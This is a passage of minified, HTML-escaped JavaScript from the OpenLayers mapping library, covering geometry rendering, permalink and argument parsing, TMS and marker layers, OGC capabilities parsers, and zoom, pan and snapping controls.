this.redrawNode(a+this.BACKGROUND_ID_SUFFIX,b,c,null)&#125;,drawGeometryNode:function(a,b,c)&#123;c=c||a._style;var d=&#123;isFilled:void 0===c.fill?!0:c.fill,isStroked:void 0===c.stroke?!!c.strokeWidth:c.stroke&#125;,e;switch(b.CLASS_NAME)&#123;case "OpenLayers.Geometry.Point":!1===c.graphic&amp;&amp;(d.isFilled=!1,d.isStroked=!1);e=this.drawPoint(a,b);break;case "OpenLayers.Geometry.LineString":d.isFilled=!1;e=this.drawLineString(a,b);break;case "OpenLayers.Geometry.LinearRing":e=this.drawLinearRing(a,b);break;case "OpenLayers.Geometry.Polygon":e=this.drawPolygon(a,b);break;case "OpenLayers.Geometry.Rectangle":e=this.drawRectangle(a,b)&#125;a._options=d;return!1!=e?&#123;node:this.setStyle(a,c,d,b),complete:e&#125;:!1&#125;,postDraw:function(a)&#123;&#125;,drawPoint:function(a,b)&#123;&#125;,drawLineString:function(a,b)&#123;&#125;,drawLinearRing:function(a,b)&#123;&#125;,drawPolygon:function(a,b)&#123;&#125;,drawRectangle:function(a,b)&#123;&#125;,drawCircle:function(a,b)&#123;&#125;,removeText:function(a)&#123;var b=document.getElementById(a+this.LABEL_ID_SUFFIX);b&amp;&amp;this.textRoot.removeChild(b);(a=document.getElementById(a+this.LABEL_OUTLINE_SUFFIX))&amp;&amp;this.textRoot.removeChild(a)&#125;,getFeatureIdFromEvent:function(a)&#123;var b=a.target,c=b&amp;&amp;b.correspondingUseElement;return(c?c:b||a.srcElement)._featureId&#125;,eraseGeometry:function(a,b)&#123;if("OpenLayers.Geometry.MultiPoint"==a.CLASS_NAME||"OpenLayers.Geometry.MultiLineString"==a.CLASS_NAME||"OpenLayers.Geometry.MultiPolygon"==a.CLASS_NAME||"OpenLayers.Geometry.Collection"==a.CLASS_NAME)for(var c=0,d=a.components.length;c&lt;d;c++)this.eraseGeometry(a.components[c],b);else(c=OpenLayers.Util.getElement(a.id))&amp;&amp;c.parentNode&amp;&amp;(c.geometry&amp;&amp;(c.geometry.destroy(),c.geometry=null),c.parentNode.removeChild(c),this.indexer&amp;&amp;this.indexer.remove(c),c._style.backgroundGraphic&amp;&amp;(c=OpenLayers.Util.getElement(a.id+this.BACKGROUND_ID_SUFFIX))&amp;&amp;c.parentNode&amp;&amp;c.parentNode.removeChild(c))&#125;,nodeFactory:function(a,b)&#123;var c=OpenLayers.Util.getElement(a);c?this.nodeTypeCompare(c,b)||(c.parentNode.removeChild(c),c=this.nodeFactory(a,b)):c=this.createNode(b,a);return c&#125;,nodeTypeCompare:function(a,b)&#123;&#125;,createNode:function(a,b)&#123;&#125;,moveRoot:function(a)&#123;var b=this.root;a.root.parentNode==this.rendererRoot&amp;&amp;(b=a.root);b.parentNode.removeChild(b);a.rendererRoot.appendChild(b)&#125;,getRenderLayerId:function()&#123;return this.root.parentNode.parentNode.id&#125;,isComplexSymbol:function(a)&#123;return"circle"!=a&amp;&amp;!!a&#125;,CLASS_NAME:"OpenLayers.Renderer.Elements"&#125;);OpenLayers.Control.ArgParser=OpenLayers.Class(OpenLayers.Control,&#123;center:null,zoom:null,layers:null,displayProjection:null,getParameters:function(a)&#123;a=a||window.location.href;var b=OpenLayers.Util.getParameters(a),c=a.indexOf("#");0&lt;c&amp;&amp;(a="?"+a.substring(c+1,a.length),OpenLayers.Util.extend(b,OpenLayers.Util.getParameters(a)));return b&#125;,setMap:function(a)&#123;OpenLayers.Control.prototype.setMap.apply(this,arguments);for(var b=0,c=this.map.controls.length;b&lt;c;b++)&#123;var d=this.map.controls[b];if(d!=this&amp;&amp;"OpenLayers.Control.ArgParser"==d.CLASS_NAME)&#123;d.displayProjection!=this.displayProjection&amp;&amp;(this.displayProjection=d.displayProjection);break&#125;&#125;b==this.map.controls.length&amp;&amp;(b=this.getParameters(),b.layers&amp;&amp;(this.layers=b.layers,this.map.events.register("addlayer",this,this.configureLayers),this.configureLayers()),b.lat&amp;&amp;b.lon&amp;&amp;(this.center=new OpenLayers.LonLat(parseFloat(b.lon),parseFloat(b.lat)),b.zoom&amp;&amp;(this.zoom=parseFloat(b.zoom)),this.map.events.register("changebaselayer",this,this.setCenter),this.setCenter()))&#125;,setCenter:function()&#123;this.map.baseLayer&amp;&amp;(this.map.events.unregister("changebaselayer",this,this.setCenter),this.displayProjection&amp;&amp;this.center.transform(this.displayProjection,this.map.getProjectionObject()),this.map.setCenter(this.center,this.zoom))&#125;,configureLayers:function()&#123;if(this.layers.length==this.map.layers.length)&#123;this.map.events.unregister("addlayer",this,this.configureLayers);for(var a=0,b=this.layers.length;a&lt;b;a++)&#123;var c=this.map.layers[a],d=this.layers.charAt(a);"B"==d?this.map.setBaseLayer(c):"T"!=d&amp;&amp;"F"!=d||c.setVisibility("T"==d)&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Control.ArgParser"&#125;);OpenLayers.Control.Permalink=OpenLayers.Class(OpenLayers.Control,&#123;argParserClass:OpenLayers.Control.ArgParser,element:null,anchor:!1,base:"",displayProjection:null,initialize:function(a,b,c)&#123;null===a||"object"!=typeof a||OpenLayers.Util.isElement(a)?(OpenLayers.Control.prototype.initialize.apply(this,[c]),this.element=OpenLayers.Util.getElement(a),this.base=b||document.location.href):(this.base=document.location.href,OpenLayers.Control.prototype.initialize.apply(this,[a]),null!=this.element&amp;&amp;(this.element=OpenLayers.Util.getElement(this.element)))&#125;,destroy:function()&#123;this.element&amp;&amp;this.element.parentNode==this.div&amp;&amp;(this.div.removeChild(this.element),this.element=null);this.map&amp;&amp;this.map.events.unregister("moveend",this,this.updateLink);OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,setMap:function(a)&#123;OpenLayers.Control.prototype.setMap.apply(this,arguments);for(var b=0,c=this.map.controls.length;b&lt;c;b++)&#123;var d=this.map.controls[b];if(d.CLASS_NAME==this.argParserClass.CLASS_NAME)&#123;d.displayProjection!=this.displayProjection&amp;&amp;(this.displayProjection=d.displayProjection);break&#125;&#125;b==this.map.controls.length&amp;&amp;this.map.addControl(new this.argParserClass(&#123;displayProjection:this.displayProjection&#125;))&#125;,draw:function()&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||this.anchor||(this.element=document.createElement("a"),this.element.innerHTML=OpenLayers.i18n("Permalink"),this.element.href="",this.div.appendChild(this.element));this.map.events.on(&#123;moveend:this.updateLink,changelayer:this.updateLink,changebaselayer:this.updateLink,scope:this&#125;);this.updateLink();return this.div&#125;,updateLink:function()&#123;var a=this.anchor?"#":"?",b=this.base,c=null;-1!=b.indexOf("#")&amp;&amp;!1==this.anchor&amp;&amp;(c=b.substring(b.indexOf("#"),b.length));-1!=b.indexOf(a)&amp;&amp;(b=b.substring(0,b.indexOf(a)));b=b.split("#")[0]+a+OpenLayers.Util.getParameterString(this.createParams());c&amp;&amp;(b+=c);this.anchor&amp;&amp;!this.element?window.location.href=b:this.element.href=b&#125;,createParams:function(a,b,c)&#123;a=a||this.map.getCenter();var d=OpenLayers.Util.getParameters(this.base);if(a)for(d.zoom=b||this.map.getZoom(),b=a.lat,a=a.lon,this.displayProjection&amp;&amp;(b=OpenLayers.Projection.transform(&#123;x:a,y:b&#125;,this.map.getProjectionObject(),this.displayProjection),a=b.x,b=b.y),d.lat=Math.round(1E5*b)/1E5,d.lon=Math.round(1E5*a)/1E5,c=c||this.map.layers,d.layers="",a=0,b=c.length;a&lt;b;a++)&#123;var e=c[a];d.layers=e.isBaseLayer?d.layers+(e==this.map.baseLayer?"B":"0"):d.layers+(e.getVisibility()?"T":"F")&#125;return d&#125;,CLASS_NAME:"OpenLayers.Control.Permalink"&#125;);OpenLayers.Layer.TMS=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;serviceVersion:"1.0.0",layername:null,type:null,isBaseLayer:!0,tileOrigin:null,serverResolutions:null,zoomOffset:0,initialize:function(a,b,c)&#123;var d=[];d.push(a,b,&#123;&#125;,c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,d)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.TMS(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,getURL:function(a)&#123;a=this.adjustBounds(a);var b=this.getServerResolution(),c=Math.round((a.left-this.tileOrigin.lon)/(b*this.tileSize.w));a=Math.round((a.bottom-this.tileOrigin.lat)/(b*this.tileSize.h));b=this.getServerZoom();c=this.serviceVersion+"/"+this.layername+"/"+b+"/"+c+"/"+a+"."+this.type;a=this.url;OpenLayers.Util.isArray(a)&amp;&amp;(a=this.selectUrl(c,a));return a+c&#125;,setMap:function(a)&#123;OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments);this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.map.maxExtent.left,this.map.maxExtent.bottom))&#125;,CLASS_NAME:"OpenLayers.Layer.TMS"&#125;);OpenLayers.Format.WCSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;defaultVersion:"1.1.0",CLASS_NAME:"OpenLayers.Format.WCSCapabilities"&#125;);OpenLayers.Format.WCSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,&#123;regExes:&#123;trimSpace:/^\s*|\s*$/g,splitSpace:/\s+/&#125;,defaultPrefix:"wcs",read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;this.readNode(a,b);return b&#125;,CLASS_NAME:"OpenLayers.Format.WCSCapabilities.v1"&#125;);OpenLayers.Format.WCSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.WCSCapabilities.v1,&#123;namespaces:&#123;wcs:"http://www.opengis.net/wcs",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",ows:"http://www.opengis.net/ows"&#125;,errorProperty:"service",readers:&#123;wcs:&#123;WCS_Capabilities:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Service:function(a,b)&#123;b.service=&#123;&#125;;this.readChildNodes(a,b.service)&#125;,name:function(a,b)&#123;b.name=this.getChildValue(a)&#125;,label:function(a,b)&#123;b.label=this.getChildValue(a)&#125;,keywords:function(a,b)&#123;b.keywords=[];this.readChildNodes(a,b.keywords)&#125;,keyword:function(a,b)&#123;b.push(this.getChildValue(a))&#125;,responsibleParty:function(a,b)&#123;b.responsibleParty=&#123;&#125;;this.readChildNodes(a,b.responsibleParty)&#125;,individualName:function(a,b)&#123;b.individualName=this.getChildValue(a)&#125;,organisationName:function(a,b)&#123;b.organisationName=this.getChildValue(a)&#125;,positionName:function(a,b)&#123;b.positionName=this.getChildValue(a)&#125;,contactInfo:function(a,b)&#123;b.contactInfo=&#123;&#125;;this.readChildNodes(a,b.contactInfo)&#125;,phone:function(a,b)&#123;b.phone=&#123;&#125;;this.readChildNodes(a,b.phone)&#125;,voice:function(a,b)&#123;b.voice=this.getChildValue(a)&#125;,facsimile:function(a,b)&#123;b.facsimile=this.getChildValue(a)&#125;,address:function(a,b)&#123;b.address=&#123;&#125;;this.readChildNodes(a,b.address)&#125;,deliveryPoint:function(a,b)&#123;b.deliveryPoint=this.getChildValue(a)&#125;,city:function(a,b)&#123;b.city=this.getChildValue(a)&#125;,postalCode:function(a,b)&#123;b.postalCode=this.getChildValue(a)&#125;,country:function(a,b)&#123;b.country=this.getChildValue(a)&#125;,electronicMailAddress:function(a,b)&#123;b.electronicMailAddress=this.getChildValue(a)&#125;,fees:function(a,b)&#123;b.fees=this.getChildValue(a)&#125;,accessConstraints:function(a,b)&#123;b.accessConstraints=this.getChildValue(a)&#125;,ContentMetadata:function(a,b)&#123;b.contentMetadata=[];this.readChildNodes(a,b.contentMetadata)&#125;,CoverageOfferingBrief:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.push(c)&#125;,name:function(a,b)&#123;b.name=this.getChildValue(a)&#125;,label:function(a,b)&#123;b.label=this.getChildValue(a)&#125;,lonLatEnvelope:function(a,b)&#123;var c=this.getElementsByTagNameNS(a,"http://www.opengis.net/gml","pos");if(2==c.length)&#123;var d=&#123;&#125;,e=&#123;&#125;;OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[c[0],d]);OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[c[1],e]);b.lonLatEnvelope=&#123;&#125;;b.lonLatEnvelope.srsName=a.getAttribute("srsName");b.lonLatEnvelope.min=d.points[0];b.lonLatEnvelope.max=e.points[0]&#125;&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Format.WCSCapabilities.v1_0_0"&#125;);OpenLayers.Strategy.Fixed=OpenLayers.Class(OpenLayers.Strategy,&#123;preload:!1,activate:function()&#123;var a=OpenLayers.Strategy.prototype.activate.apply(this,arguments);if(a)if(this.layer.events.on(&#123;refresh:this.load,scope:this&#125;),!0==this.layer.visibility||this.preload)this.load();else this.layer.events.on(&#123;visibilitychanged:this.load,scope:this&#125;);return a&#125;,deactivate:function()&#123;var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;this.layer.events.un(&#123;refresh:this.load,visibilitychanged:this.load,scope:this&#125;);return a&#125;,load:function(a)&#123;var b=this.layer;b.events.triggerEvent("loadstart",&#123;filter:b.filter&#125;);b.protocol.read(OpenLayers.Util.applyDefaults(&#123;callback:this.merge,filter:b.filter,scope:this&#125;,a));b.events.un(&#123;visibilitychanged:this.load,scope:this&#125;)&#125;,merge:function(a)&#123;var b=this.layer;b.destroyFeatures();var c=a.features;if(c&amp;&amp;0&lt;c.length)&#123;var d=b.projection,e=b.map.getProjectionObject();if(!e.equals(d))for(var f,g=0,h=c.length;g&lt;h;++g)(f=c[g].geometry)&amp;&amp;f.transform(d,e);b.addFeatures(c)&#125;b.events.triggerEvent("loadend",&#123;response:a&#125;)&#125;,CLASS_NAME:"OpenLayers.Strategy.Fixed"&#125;);OpenLayers.Control.Zoom=OpenLayers.Class(OpenLayers.Control,&#123;zoomInText:"+",zoomInId:"olZoomInLink",zoomOutText:"\u2212",zoomOutId:"olZoomOutLink",draw:function()&#123;var a=OpenLayers.Control.prototype.draw.apply(this),b=this.getOrCreateLinks(a),c=b.zoomIn,b=b.zoomOut,d=this.map.events;b.parentNode!==a&amp;&amp;(d=this.events,d.attachToElement(b.parentNode));d.register("buttonclick",this,this.onZoomClick);this.zoomInLink=c;this.zoomOutLink=b;return a&#125;,getOrCreateLinks:function(a)&#123;var b=document.getElementById(this.zoomInId),c=document.getElementById(this.zoomOutId);b||(b=document.createElement("a"),b.href="#zoomIn",b.appendChild(document.createTextNode(this.zoomInText)),b.className="olControlZoomIn",a.appendChild(b));OpenLayers.Element.addClass(b,"olButton");c||(c=document.createElement("a"),c.href="#zoomOut",c.appendChild(document.createTextNode(this.zoomOutText)),c.className="olControlZoomOut",a.appendChild(c));OpenLayers.Element.addClass(c,"olButton");return&#123;zoomIn:b,zoomOut:c&#125;&#125;,onZoomClick:function(a)&#123;a=a.buttonElement;a===this.zoomInLink?this.map.zoomIn():a===this.zoomOutLink&amp;&amp;this.map.zoomOut()&#125;,destroy:function()&#123;this.map&amp;&amp;this.map.events.unregister("buttonclick",this,this.onZoomClick);delete this.zoomInLink;delete this.zoomOutLink;OpenLayers.Control.prototype.destroy.apply(this)&#125;,CLASS_NAME:"OpenLayers.Control.Zoom"&#125;);OpenLayers.Layer.PointTrack=OpenLayers.Class(OpenLayers.Layer.Vector,&#123;dataFrom:null,styleFrom:null,addNodes:function(a,b)&#123;if(2&gt;a.length)throw Error("At least two point features have to be added to create a line from");for(var c=Array(a.length-1),d,e,f,g=0,h=a.length;g&lt;h;g++)&#123;d=a[g];f=d.geometry;if(!f)f=d.lonlat,f=new OpenLayers.Geometry.Point(f.lon,f.lat);else if("OpenLayers.Geometry.Point"!=f.CLASS_NAME)throw new TypeError("Only features with point geometries are supported.");if(0&lt;g)&#123;d=null!=this.dataFrom?a[g+this.dataFrom].data||a[g+this.dataFrom].attributes:null;var k=null!=this.styleFrom?a[g+this.styleFrom].style:null;e=new OpenLayers.Geometry.LineString([e,f]);c[g-1]=new OpenLayers.Feature.Vector(e,d,k)&#125;e=f&#125;this.addFeatures(c,b)&#125;,CLASS_NAME:"OpenLayers.Layer.PointTrack"&#125;);OpenLayers.Layer.PointTrack.SOURCE_NODE=-1;OpenLayers.Layer.PointTrack.TARGET_NODE=0;OpenLayers.Layer.PointTrack.dataFrom=&#123;SOURCE_NODE:-1,TARGET_NODE:0&#125;;OpenLayers.Protocol.WFS=function(a)&#123;a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.WFS.DEFAULTS);var b=OpenLayers.Protocol.WFS["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported WFS version: "+a.version;return new b(a)&#125;;OpenLayers.Protocol.WFS.fromWMSLayer=function(a,b)&#123;var c,d;c=a.params.LAYERS;c=(OpenLayers.Util.isArray(c)?c[0]:c).split(":");1&lt;c.length&amp;&amp;(d=c[0]);c=c.pop();d=&#123;url:a.url,featureType:c,featurePrefix:d,srsName:a.projection&amp;&amp;a.projection.getCode()||a.map&amp;&amp;a.map.getProjectionObject().getCode(),version:"1.1.0"&#125;;return new OpenLayers.Protocol.WFS(OpenLayers.Util.applyDefaults(b,d))&#125;;OpenLayers.Protocol.WFS.DEFAULTS=&#123;version:"1.0.0"&#125;;OpenLayers.Layer.Markers=OpenLayers.Class(OpenLayers.Layer,&#123;isBaseLayer:!1,markers:null,drawn:!1,initialize:function(a,b)&#123;OpenLayers.Layer.prototype.initialize.apply(this,arguments);this.markers=[]&#125;,destroy:function()&#123;this.clearMarkers();this.markers=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)&#125;,setOpacity:function(a)&#123;if(a!=this.opacity)&#123;this.opacity=a;a=0;for(var b=this.markers.length;a&lt;b;a++)this.markers[a].setOpacity(this.opacity)&#125;&#125;,moveTo:function(a,b,c)&#123;OpenLayers.Layer.prototype.moveTo.apply(this,arguments);if(b||!this.drawn)&#123;for(var d=0,e=this.markers.length;d&lt;e;d++)this.drawMarker(this.markers[d]);this.drawn=!0&#125;&#125;,addMarker:function(a)&#123;this.markers.push(a);1&gt;this.opacity&amp;&amp;a.setOpacity(this.opacity);this.map&amp;&amp;this.map.getExtent()&amp;&amp;(a.map=this.map,this.drawMarker(a))&#125;,removeMarker:function(a)&#123;this.markers&amp;&amp;this.markers.length&amp;&amp;(OpenLayers.Util.removeItem(this.markers,a),a.erase())&#125;,clearMarkers:function()&#123;if(null!=this.markers)for(;0&lt;this.markers.length;)this.removeMarker(this.markers[0])&#125;,drawMarker:function(a)&#123;var b=this.map.getLayerPxFromLonLat(a.lonlat);null==b?a.display(!1):a.isDrawn()?a.icon&amp;&amp;a.icon.moveTo(b):(a=a.draw(b),this.div.appendChild(a))&#125;,getDataExtent:function()&#123;var a=null;if(this.markers&amp;&amp;0&lt;this.markers.length)for(var a=new OpenLayers.Bounds,b=0,c=this.markers.length;b&lt;c;b++)a.extend(this.markers[b].lonlat);return a&#125;,CLASS_NAME:"OpenLayers.Layer.Markers"&#125;);OpenLayers.Control.Pan=OpenLayers.Class(OpenLayers.Control.Button,&#123;slideFactor:50,slideRatio:null,direction:null,initialize:function(a,b)&#123;this.direction=a;this.CLASS_NAME+=this.direction;OpenLayers.Control.prototype.initialize.apply(this,[b])&#125;,trigger:function()&#123;if(this.map)&#123;var a=OpenLayers.Function.bind(function(a)&#123;return this.slideRatio?this.map.getSize()[a]*this.slideRatio:this.slideFactor&#125;,this);switch(this.direction)&#123;case OpenLayers.Control.Pan.NORTH:this.map.pan(0,-a("h"));break;case OpenLayers.Control.Pan.SOUTH:this.map.pan(0,a("h"));break;case OpenLayers.Control.Pan.WEST:this.map.pan(-a("w"),0);break;case OpenLayers.Control.Pan.EAST:this.map.pan(a("w"),0)&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Control.Pan"&#125;);OpenLayers.Control.Pan.NORTH="North";OpenLayers.Control.Pan.SOUTH="South";OpenLayers.Control.Pan.EAST="East";OpenLayers.Control.Pan.WEST="West";OpenLayers.Format.CSWGetDomain=function(a)&#123;a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.CSWGetDomain.DEFAULTS);var b=OpenLayers.Format.CSWGetDomain["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported CSWGetDomain version: "+a.version;return new b(a)&#125;;OpenLayers.Format.CSWGetDomain.DEFAULTS=&#123;version:"2.0.2"&#125;;OpenLayers.Format.CSWGetDomain.v2_0_2=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",csw:"http://www.opengis.net/cat/csw/2.0.2"&#125;,defaultPrefix:"csw",version:"2.0.2",schemaLocation:"http://www.opengis.net/cat/csw/2.0.2 http://schemas.opengis.net/csw/2.0.2/CSW-discovery.xsd",PropertyName:null,ParameterName:null,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;this.readNode(a,b);return b&#125;,readers:&#123;csw:&#123;GetDomainResponse:function(a,b)&#123;this.readChildNodes(a,b)&#125;,DomainValues:function(a,b)&#123;OpenLayers.Util.isArray(b.DomainValues)||(b.DomainValues=[]);for(var c=a.attributes,d=&#123;&#125;,e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;this.readChildNodes(a,d);b.DomainValues.push(d)&#125;,PropertyName:function(a,b)&#123;b.PropertyName=this.getChildValue(a)&#125;,ParameterName:function(a,b)&#123;b.ParameterName=this.getChildValue(a)&#125;,ListOfValues:function(a,b)&#123;OpenLayers.Util.isArray(b.ListOfValues)||(b.ListOfValues=[]);this.readChildNodes(a,b.ListOfValues)&#125;,Value:function(a,b)&#123;for(var c=a.attributes,d=&#123;&#125;,e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.push(&#123;Value:d&#125;)&#125;,ConceptualScheme:function(a,b)&#123;b.ConceptualScheme=&#123;&#125;;this.readChildNodes(a,b.ConceptualScheme)&#125;,Name:function(a,b)&#123;b.Name=this.getChildValue(a)&#125;,Document:function(a,b)&#123;b.Document=this.getChildValue(a)&#125;,Authority:function(a,b)&#123;b.Authority=this.getChildValue(a)&#125;,RangeOfValues:function(a,b)&#123;b.RangeOfValues=&#123;&#125;;this.readChildNodes(a,b.RangeOfValues)&#125;,MinValue:function(a,b)&#123;for(var c=a.attributes,d=&#123;&#125;,e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.MinValue=d&#125;,MaxValue:function(a,b)&#123;for(var c=a.attributes,d=&#123;&#125;,e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.MaxValue=d&#125;&#125;&#125;,write:function(a)&#123;a=this.writeNode("csw:GetDomain",a);return OpenLayers.Format.XML.prototype.write.apply(this,[a])&#125;,writers:&#123;csw:&#123;GetDomain:function(a)&#123;var b=this.createElementNSPlus("csw:GetDomain",&#123;attributes:&#123;service:"CSW",version:this.version&#125;&#125;);a.PropertyName||this.PropertyName?this.writeNode("csw:PropertyName",a.PropertyName||this.PropertyName,b):(a.ParameterName||this.ParameterName)&amp;&amp;this.writeNode("csw:ParameterName",a.ParameterName||this.ParameterName,b);this.readChildNodes(b,a);return b&#125;,PropertyName:function(a)&#123;return this.createElementNSPlus("csw:PropertyName",&#123;value:a&#125;)&#125;,ParameterName:function(a)&#123;return this.createElementNSPlus("csw:ParameterName",&#123;value:a&#125;)&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Format.CSWGetDomain.v2_0_2"&#125;);OpenLayers.Format.ArcXML.Features=OpenLayers.Class(OpenLayers.Format.XML,&#123;read:function(a)&#123;return(new OpenLayers.Format.ArcXML).read(a).features.feature&#125;&#125;);OpenLayers.Control.Snapping=OpenLayers.Class(OpenLayers.Control,&#123;DEFAULTS:&#123;tolerance:10,node:!0,edge:!0,vertex:!0&#125;,greedy:!0,precedence:["node","vertex","edge"],resolution:null,geoToleranceCache:null,layer:null,feature:null,point:null,initialize:function(a)&#123;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.options=a||&#123;&#125;;this.options.layer&amp;&amp;this.setLayer(this.options.layer);a=OpenLayers.Util.extend(&#123;&#125;,this.options.defaults);this.defaults=OpenLayers.Util.applyDefaults(a,this.DEFAULTS);this.setTargets(this.options.targets);0===this.targets.length&amp;&amp;this.layer&amp;&amp;this.addTargetLayer(this.layer);this.geoToleranceCache=&#123;&#125;&#125;,setLayer:function(a)&#123;this.active?(this.deactivate(),this.layer=a,this.activate()):this.layer=a&#125;,setTargets:function(a)&#123;this.targets=[];if(a&amp;&amp;a.length)for(var b,c=0,d=a.length;c&lt;d;++c)b=a[c],b instanceof OpenLayers.Layer.Vector?this.addTargetLayer(b):this.addTarget(b)&#125;,addTargetLayer:function(a)&#123;this.addTarget(&#123;layer:a&#125;)&#125;,addTarget:function(a)&#123;a=OpenLayers.Util.applyDefaults(a,this.defaults);a.nodeTolerance=a.nodeTolerance||a.tolerance;a.vertexTolerance=a.vertexTolerance||a.tolerance;a.edgeTolerance=a.edgeTolerance||a.tolerance;this.targets.push(a)&#125;,removeTargetLayer:function(a)&#123;for(var b,c=this.targets.length-1;0&lt;=c;--c)b=this.targets[c],b.layer===a&amp;&amp;this.removeTarget(b)&#125;,removeTarget:function(a)&#123;return OpenLayers.Util.removeItem(this.targets,a)&#125;,activate:function()&#123;var a=OpenLayers.Control.prototype.activate.call(this);if(a&amp;&amp;this.layer&amp;&amp;this.layer.events)this.layer.events.on(&#123;sketchstarted:this.onSketchModified,sketchmodified:this.onSketchModified,vertexmodified:this.onVertexModified,scope:this&#125;);return a&#125;,deactivate:function()&#123;var a=OpenLayers.Control.prototype.deactivate.call(this);a&amp;&amp;this.layer&amp;&amp;this.layer.events&amp;&amp;this.layer.events.un(&#123;sketchstarted:this.onSketchModified,sketchmodified:this.onSketchModified,vertexmodified:this.onVertexModified,scope:this&#125;);this.point=this.feature=null;return a&#125;,onSketchModified:function(a)&#123;this.feature=a.feature;this.considerSnapping(a.vertex,a.vertex)&#125;,onVertexModified:function(a)&#123;this.feature=a.feature;var b=this.layer.map.getLonLatFromViewPortPx(a.pixel);this.considerSnapping(a.vertex,new OpenLayers.Geometry.Point(b.lon,b.lat))&#125;,considerSnapping:function(a,b)&#123;for(var c=&#123;rank:Number.POSITIVE_INFINITY,dist:Number.POSITIVE_INFINITY,x:null,y:null&#125;,d=!1,e,f,g=0,h=this.targets.length;g&lt;h;++g)if(f=this.targets[g],e=this.testTarget(f,b))if(this.greedy)&#123;c=e;c.target=f;d=!0;break&#125;else if(e.rank&lt;c.rank||e.rank===c.rank&amp;&amp;e.dist&lt;c.dist)c=e,c.target=f,d=!0;d&amp;&amp;(!1!==this.events.triggerEvent("beforesnap",&#123;point:a,x:c.x,y:c.y,distance:c.dist,layer:c.target.layer,snapType:this.precedence[c.rank]&#125;)?(a.x=c.x,a.y=c.y,this.point=a,this.events.triggerEvent("snap",&#123;point:a,snapType:this.precedence[c.rank],layer:c.target.layer,distance:c.dist&#125;)):d=!1);this.point&amp;&amp;!d&amp;&amp;(a.x=b.x,a.y=b.y,this.point=null,this.events.triggerEvent("unsnap",&#123;point:a&#125;))&#125;,testTarget:function(a,b)&#123;var c=this.layer.map.getResolution();if("minResolution"in a&amp;&amp;c&lt;a.minResolution||"maxResolution"in a&amp;&amp;c&gt;=a.maxResolution)return null;for(var c=&#123;node:this.getGeoTolerance(a.nodeTolerance,c),vertex:this.getGeoTolerance(a.vertexTolerance,c),edge:this.getGeoTolerance(a.edgeTolerance,c)&#125;,d=Math.max(c.node,c.vertex,c.edge),e=&#123;rank:Number.POSITIVE_INFINITY,dist:Number.POSITIVE_INFINITY&#125;,f=!1,g=a.layer.features,h,k,l,m,n,p,q=this.precedence.length,r=new OpenLayers.LonLat(b.x,b.y),s=0,t=g.length;s&lt;t;++s)if(h=g[s],h!==this.feature&amp;&amp;(!h._sketch&amp;&amp;h.state!==OpenLayers.State.DELETE&amp;&amp;(!a.filter||a.filter.evaluate(h)))&amp;&amp;h.atPoint(r,d,d))for(var u=0,v=Math.min(e.rank+1,q);u&lt;v;++u)if(k=this.precedence[u],a[k])if("edge"===k)&#123;if(l=h.geometry.distanceTo(b,&#123;details:!0&#125;),n=l.distance,n&lt;=c[k]&amp;&amp;n&lt;e.dist)&#123;e=&#123;rank:u,dist:n,x:l.x0,y:l.y0&#125;;f=!0;break&#125;&#125;else&#123;l=h.geometry.getVertices("node"===k);p=!1;for(var w=0,x=l.length;w&lt;x;++w)m=l[w],n=m.distanceTo(b),n&lt;=c[k]&amp;&amp;(u&lt;e.rank||u===e.rank&amp;&amp;n&lt;e.dist)&amp;&amp;(e=&#123;rank:u,dist:n,x:m.x,y:m.y&#125;,p=f=!0);if(p)break&#125;return f?e:null&#125;,getGeoTolerance:function(a,b)&#123;b!==this.resolution&amp;&amp;(this.resolution=b,this.geoToleranceCache=&#123;&#125;);var c=this.geoToleranceCache[a];void 0===c&amp;&amp;(c=a*b,this.geoToleranceCache[a]=c);return c&#125;,destroy:function()&#123;this.active&amp;&amp;this.deactivate();delete this.layer;delete 